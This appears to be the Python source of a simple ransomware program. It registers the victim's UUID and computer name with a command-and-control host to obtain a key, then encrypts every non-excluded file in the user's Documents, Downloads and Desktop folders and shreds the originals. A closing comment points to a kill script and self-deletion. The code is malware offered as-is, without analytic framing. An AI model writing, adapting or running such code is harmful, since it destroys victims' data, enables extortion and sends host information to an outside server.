# get a KEY from the C&C server

import requests, uuid, os
UUID = uuid.uuid4()
host_name = os.environ['COMPUTERNAME']
encryption_key = ""

# register with C&C server
while encryption_key == "":
    url = 'http://commandandcontrol.netai.net/register.php'
    payload = {'uuid': UUID, 'host': host_name}

    r = requests.get(url, params=payload)

    if r.status_code == 200:
        encryption_key = r.text.split("<")[0].strip().encode('utf8')
    else:
        pass

from ransomcrypto import *

excluded_filetypes = ['.enc','.exe', '.bat', '.tar.gz', '.js', '.html', '.py']


priority_dirs = ['Documents', 'Downloads', 'Desktop'] # would normally do all folders in users home dir

for target in priority_dirs:
    for dirName, subdirList, fileList in os.walk(os.path.expanduser("~/"+target), topdown=False):
        print dirName

        for file_name in fileList:
            file_name_loc = os.path.join(dirName, file_name)

            name, ext = os.path.splitext(file_name_loc)

            if ext not in excluded_filetypes:
                print file_name_loc

                # create new encrypted file with .enc extension

                try:
                    with open(file_name_loc, 'rb+') as in_file, open(file_name_loc+".enc", 'wb+') as out_file:
                        encrypt(in_file, out_file, encryption_key)
                except:
                    continue

                # shred the orginial file

                shred(file_name_loc, 2)

                # onto the next



# generate kill script and delete self # open URL
